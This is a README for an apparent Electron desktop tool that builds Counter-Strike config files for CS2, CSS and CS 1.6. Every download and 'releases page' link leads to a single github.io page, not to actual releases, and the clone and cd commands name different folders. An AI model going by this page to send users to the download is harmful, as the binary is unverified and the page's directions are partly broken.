# CsBuilder - Configuration Builder 2026

> **A contemporary desktop app for creating custom Counter-Strike configuration files (autoexec.cfg) visually, with support for CS2, CSS, and CS 1.6 and no coding required.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victor-adams1990/csbuilder-cfg-editor?style=flat-square)](https://github.com/victor-adams1990/csbuilder-cfg-editor)

---

<p align="center">
  <a href="https://victor-adams1990.github.io/csbuilder-cfg-editor/">
    <img src="https://img.shields.io/badge/Download-CsBuilder%20Latest-brightgreen?style=for-the-badge" alt="Download CsBuilder">
  </a>
</p>

> **[Direct Download - CsBuilder v1.0](https://victor-adams1990.github.io/csbuilder-cfg-editor/)**

---

[Download Latest Build](https://victor-adams1990.github.io/csbuilder-cfg-editor/)

---

## What CsBuilder Does

CsBuilder changes how Counter-Strike players assemble their config files. Rather than editing plain text by hand or keeping track of console commands, this desktop program gives you a visual workspace where crosshair tweaks, bindings, and other settings can be adjusted through clicks and sliders. It streamlines autoexec.cfg creation so beginners can get started quickly while advanced users still have room to fine-tune every detail.

The app is built on Electron and uses a modern dark interface. It works with three Counter-Strike releases: CS2, Counter-Strike: Source, and Counter-Strike 1.6. Game-specific syntax differences are handled for you, which helps ensure the generated config fits the title you picked. From competitive crosshair tuning to practice-focused aliases, CsBuilder packages the essentials into an easy-to-use desktop tool.

---

## Highlights

- **Support for Multiple Games** - Build configs for CS2, CSS, and CS 1.6 with syntax adjusted automatically for each version
- **Crosshair Customization Tools** - Change gap, thickness, outline, dot, color, and more with a live preview
- **Integrated eDPI Calculator** - Combine sensitivity and DPI to calculate your exact effective dots per inch
- **Sensitivity Conversion Tool** - Convert mouse sensitivity values across different Counter-Strike titles
- **Key Bind Editor** - Map actions, weapons, and utilities to any key through a visual layout
- **Prebuilt Aliases** - Use ready-made aliases for bhopping, grenade lineups, and practice workflows
- **Practice Mode Builder** - Create training setups with bots, unlimited ammo, and fly mode
- **Real-Time CFG Preview** - Watch the config output update immediately as you edit
- **Import and Export Support** - Open existing CFG files or share your own creations
- **Preset Management** - Store and swap between multiple profiles for different playstyles

---

## Getting Started

Clone the repo or grab the latest release:

```bash
git clone https://github.com/victor-adams1990/csbuilder-cfg-editor.git
cd CsBuilder-cfg-builder
```

For the packaged desktop build, download the right file for your operating system from the [releases page](https://victor-adams1990.github.io/csbuilder-cfg-editor/). The pre-built version does not require any extra dependencies.

To launch from source:

```bash
npm install
npm start
```

---

## How to Use

After opening CsBuilder, the main dashboard presents five core areas: Crosshair, Sensitivity, Key Binds, Aliases, and Practice Mode.

**Building a simple config:**

1. Pick the target game (CS2, CSS, or CS 1.6) from the top dropdown
2. Go to the Crosshair tab and fine-tune values with the visual sliders
3. Open Sensitivity and enter your mouse DPI and in-game sensitivity
4. Use Key Binds to set actions such as jump, crouch, or weapon changes
5. Click "Generate CFG" to turn your settings into a ready-to-use autoexec.cfg
6. Save the file in your Counter-Strike configuration directory

**Example sensitivity conversion:**

```bash
# Example: Convert CS2 sensitivity to CS 1.6
Input: 2.5 @ 800 DPI (CS2)
Output: 3.2 @ 800 DPI (CS 1.6)
```

---

## Configuration Storage

The application keeps all settings in a local JSON file inside the user data directory. At any time, you can export the full setup as a standalone CFG file.

Default configuration location:
- Windows: `%APPDATA%/CsBuilder/config.json`
- macOS: `~/Library/Application Support/CsBuilder/config.json`
- Linux: `~/.config/CsBuilder/config.json`

Presets are written as separate JSON files, and they can be imported or exported for sharing.

---

## System Requirements

- **Operating System:** Windows 10+, macOS 10.15+, or Linux (modern distributions)
- **Runtime:** Electron-based standalone app (no browser required)
- **Storage:** Approximately 100 MB for the application
- **Display:** 1280x720 minimum resolution recommended
- **Memory:** 512 MB RAM minimum

---

## Common Questions

**Q: Is Counter-Strike 2 supported?**  
A: Yes, CS2 is supported, along with Counter-Strike: Source and Counter-Strike 1.6.

**Q: Can I bring in an existing autoexec.cfg?**  
A: Yes, you can import existing CFG files and edit them visually with the import feature.

**Q: How do I get updates?**  
A: Visit the [releases page](https://victor-adams1990.github.io/csbuilder-cfg-editor/) to check for new versions. The application will notify you when updates are available.

**Q: Where should the generated autoexec.cfg go?**  
A: For CS2, place the file in `steamapps/common/Counter-Strike Global Offensive/game/csgo/cfg/`. For the other titles, use their corresponding configuration folders.

**Q: Does CsBuilder work without an internet connection?**  
A: Yes, once installed, the app runs fully offline. No internet access is needed to create configurations.

**Q: How can I restore the defaults?**  
A: Remove the config.json file from the application data folder, or choose "Reset to Defaults" from the settings menu.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
